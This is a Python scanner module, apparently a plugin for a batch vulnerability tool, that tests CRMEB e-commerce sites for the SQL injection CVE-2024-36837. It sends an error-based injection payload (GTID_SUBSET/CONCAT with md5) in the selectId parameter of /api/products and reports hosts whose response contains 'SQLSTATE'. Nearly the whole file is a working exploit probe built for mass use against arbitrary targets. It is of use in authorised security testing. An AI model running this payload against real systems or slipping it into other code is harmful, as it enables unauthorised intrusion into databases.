import requests,urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
class Cve_2024_36837:
    def main(self,target):
        self.batch = target["batch_work"]
        baseurl = target['url'].strip('/ ')
        self.ssl = target["ssl"]
        header = target["header"]
        proxy = target["proxy"]
        headers, self.proxy = ReqSet(header=header,proxy=proxy, bwork=self.batch)

        if not self.batch:
            OutPrintInfo("CRMEB", '开始执行CRMEB-CVE-2024-36837-SQL注入检测...')
        url=baseurl+'/api/products?limit=20&priceOrder=&salesOrder=&selectId=GTID_SUBSET(CONCAT(0x7e,(SELECT+(ELT(3550=3550,md5(1)))),0x7e),3550)'
        try:
            response=requests.get(url,verify=self.ssl,headers=headers, proxies=self.proxy,timeout=8)
            if 'SQLSTATE' in response.text:
                OutPrintInfoSuc("CRMEB", f'存在CRMEB-CVE-2024-36837-SQL注入漏洞{url}')
                if self.batch:
                    OutPutFile("crmeb_2024_36837.txt",f'存在CRMEB-CVE-2024-36837-SQL注入漏洞{url}')
            else:
                if not self.batch:
                    OutPrintInfo("CRMEB", '不存在CRMEB-CVE-2024-36837-SQL注入')
        except Exception:
            if not self.batch:
                OutPrintInfo("CRMEB", '目标请求出错')
        if not self.batch:
            OutPrintInfo("CRMEB", 'CRMEB-CVE-2024-36837-SQL注入检测结束')
